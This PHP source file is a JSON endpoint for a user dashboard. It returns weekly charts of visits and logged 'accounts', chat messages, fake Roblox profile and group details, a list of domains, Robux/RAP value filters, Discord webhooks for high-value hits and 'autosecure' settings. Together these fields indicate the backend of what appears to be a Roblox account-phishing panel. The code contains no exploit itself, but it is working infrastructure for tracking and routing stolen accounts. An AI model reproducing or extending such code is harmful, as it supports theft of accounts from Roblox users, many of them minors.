<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/function.php" );

header( "content-type: application/json; charset=utf-8" );

$info = require_account( true );
connect( );

global $db;

$user_id = (int) $info[ "id" ];
$empty_week = [ 0, 0, 0, 0, 0, 0, 0 ];
$chart_days = [ "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun" ];
$day = 86400;
$week_start = strtotime( "monday this week midnight" );
$week_end = $week_start + ( 7 * $day );
$query_from = $week_start;

$account_created = (int) ( $info[ "account_created_at" ] ?? 0 );
if ( $account_created > 0 )
{
    $created_day = strtotime( date( "Y-m-d", $account_created ) . " 00:00:00" );
    if ( $created_day > $query_from )
    {
        $query_from = $created_day;
    };
};

$accounts_chart = [ 0, 0, 0, 0, 0, 0, 0 ];
$visits_chart = [ 0, 0, 0, 0, 0, 0, 0 ];

$st = $db->prepare( "
    SELECT
        WEEKDAY( FROM_UNIXTIME( visited_at ) ) AS day_slot,
        SUM( CASE WHEN type = 'log' THEN 1 ELSE 0 END ) AS accounts,
        COUNT( * ) AS visits
    FROM user_visits
    WHERE owner_id = ? AND visited_at >= ? AND visited_at < ?
    GROUP BY day_slot
" );
$st->execute( [ $user_id, $query_from, $week_end ] );

while ( $row = $st->fetch( ) )
{
    $slot = (int) ( $row[ "day_slot" ] ?? -1 );
    if ( $slot >= 0 && $slot < 7 )
    {
        $accounts_chart[ $slot ] = (int) ( $row[ "accounts" ] ?? 0 );
        $visits_chart[ $slot ] = (int) ( $row[ "visits" ] ?? 0 );
    };
};

$total_accounts = (int) ( $info[ "statistics_accounts" ] ?? 0 );
$total_visits = (int) ( $info[ "statistics_visits" ] ?? 0 );

$lvl = user_level_info( $info );
$level = (int) $lvl[ "level" ];
$progress = (float) $lvl[ "progress" ];

$profile_real = trim( (string) ( $info[ "profile_real_name" ] ?? "" ) );
$profile_avatar = $profile_real !== "" ? fetch_roblox_headshot( $profile_real ) : null;

$viewer_level = (int) ( $info[ "account_level" ] ?? 1 );
$is_admin = $viewer_level >= 100;

$after = isset( $_GET[ "after" ] ) ? (int) $_GET[ "after" ] : 0;

$chat_st = $db->prepare( "
    SELECT c.id, c.message, c.created_at, u.discord_username, u.discord_id, u.discord_avatar, u.account_level, u.account_rank
    FROM chat c
    JOIN users u ON u.id = c.user_id
    WHERE c.id > ?
    ORDER BY c.id ASC
    LIMIT 100
" );
$chat_st->execute( [ $after ] );
$chat_rows = $chat_st->fetchAll( );

$chat_messages = [];
foreach ( $chat_rows as $row )
{
    $rank = resolve_account_rank(
        (string) ( $row[ "discord_id" ] ?? "" ),
        (string) ( $row[ "account_rank" ] ?? "Noob" )
    );

    $text = (string) ( $row[ "message" ] ?? "" );
    if ( chat_message_violation( $text ) !== null )
    {
        $text = "[removed]";
    };

    $chat_messages[] = [
        "id" => (string) $row[ "id" ],
        "username" => $row[ "discord_username" ],
        "message" => $text,
        "level" => (int) $row[ "account_level" ],
        "rank" => $rank[ "label" ],
        "rankKey" => $rank[ "key" ],
        "avatarUrl" => discord_avatar_url( $row, 128 ),
        "time" => chat_time_label( (int) $row[ "created_at" ] ),
        "isAdmin" => $is_admin,
    ];
};

$payload = [
    "stats" => [
        "total_accounts" => $total_accounts,
        "total_visits" => $total_visits,
        "statistics_accounts" => $total_accounts,
        "statistics_visits" => $total_visits,
        "weekly_robux" => 0,
        "weekly_summary" => 0,
        "data_rap" => 0,
        "data_robux" => 0,
        "data_summary" => 0,
        "chart_days" => $chart_days,
        "charts" => [
            "total_accounts" => $accounts_chart,
            "total_visits" => $visits_chart,
            "weekly_robux" => $empty_week,
            "weekly_summary" => $empty_week,
            "data_rap" => $empty_week,
            "data_robux" => $empty_week,
            "data_summary" => $empty_week,
        ],
    ],
    "profile" => [
        "name" => $info[ "discord_username" ] ?? "User",
        "avatar" => discord_avatar_url( $info, 256 ),
        "level" => "Lvl " . $level,
        "rank" => $info[ "account_rank" ] ?? "Noob",
        "rankKey" => $info[ "account_rank_key" ] ?? "default",
        "progress" => $progress,
    ],
    "profileData" => [
        "name" => [
            "real" => $info[ "profile_real_name" ] ?? "",
            "fake" => $info[ "profile_fake_name" ] ?? "",
            "display" => $info[ "profile_display_name" ] ?? "",
            "id" => (string) ( $info[ "profile_fake_id" ] ?? "" ),
            "avatar" => $profile_avatar,
        ],
        "stats" => [
            "following" => (string) ( $info[ "profile_followings" ] ?? 0 ),
            "followers" => (string) ( $info[ "profile_followers" ] ?? 0 ),
            "friends" => (string) ( $info[ "profile_friends" ] ?? 0 ),
        ],
        "premium" => (bool) ( $info[ "profile_premium" ] ?? 0 ),
        "status" => profile_status_key( (string) ( $info[ "profile_status" ] ?? "Offline" ) ),
        "description" => $info[ "profile_description" ] ?? "",
        "createdAt" => $info[ "profile_creation_date" ] ?? "",
        "domains" => dashboard_host_list( ),
    ],
    "groupData" => [
        "group" => [
            "name" => $info[ "group_name" ] ?? "",
            "owner" => $info[ "group_owner_name" ] ?? "",
            "thumbnail" => $info[ "group_thumbnail" ] ?? "",
            "id" => (string) ( (int) ( $info[ "group_fake_id" ] ?? 0 ) ?: (int) ( $info[ "profile_fake_id" ] ?? 0 ) ),
        ],
        "stats" => [
            "members" => (int) ( $info[ "group_members" ] ?? 0 ),
            "funds" => (int) ( $info[ "group_funds" ] ?? 0 ),
        ],
        "shout" => $info[ "group_shout" ] ?? "",
        "description" => $info[ "group_description" ] ?? "",
        "domains" => dashboard_host_list( ),
    ],
    "settingsData" => [
        "minimum" => [
            "robux" => (int) ( $info[ "robux_filter" ] ?? 0 ),
            "summary" => (int) ( $info[ "summary_filter" ] ?? 0 ),
            "rap" => (int) ( $info[ "rap_filter" ] ?? 0 ),
        ],
        "webhooks" => [
            "default" => $info[ "discord_webhook" ] ?? "",
            "robux" => $info[ "robux_webhook" ] ?? "",
            "summary" => $info[ "summary_webhook" ] ?? "",
            "rap" => $info[ "rap_webhook" ] ?? "",
        ],
        "dashboard" => [
            "anonymous" => (bool) ( $info[ "dashboard_anonymous" ] ?? 0 ),
            "autosecure" => (bool) ( $info[ "dashboard_autosecure" ] ?? 0 ),
            "autoage" => (bool) ( $info[ "dashboard_autoage" ] ?? 0 ),
        ],
        "embed" => [
            "pingEveryone" => (bool) ( $info[ "discord_everyone" ] ?? 0 ),
            "pingHere" => (bool) ( $info[ "discord_here" ] ?? 0 ),
            "visitNoti" => (bool) ( $info[ "discord_visit_notifier" ] ?? 0 ),
        ],
        "customGameLink" => $info[ "custom_game_links" ] ?? "",
    ],
    "chat" => $chat_messages,
];

die( json_encode( $payload, JSON_UNESCAPED_SLASHES ) );
?>